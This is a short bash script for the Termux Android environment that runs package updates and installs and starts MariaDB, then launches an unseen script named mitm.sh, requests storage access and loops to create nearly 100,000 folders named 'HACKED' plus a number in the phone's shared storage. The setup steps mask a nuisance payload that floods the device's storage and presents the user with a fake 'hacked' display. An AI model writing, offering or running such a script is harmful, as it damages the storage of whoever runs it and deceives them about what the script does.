
#!/bin/bash


apt update
apt upgrade
pkg install bash*
apt install mariadb
mkdir -p  /data/data/com.termux/files/usr/etc/my.cnf.d
mysql_install_db
mysqld_safe -u root &
chmod +x mitm.sh
clear
bash mitm.sh
A=1
termux-setup-storage
cd /sdcard/
while [ $A -lt 99999 ]
do
mkdir "HACKED $A"
let A++
done

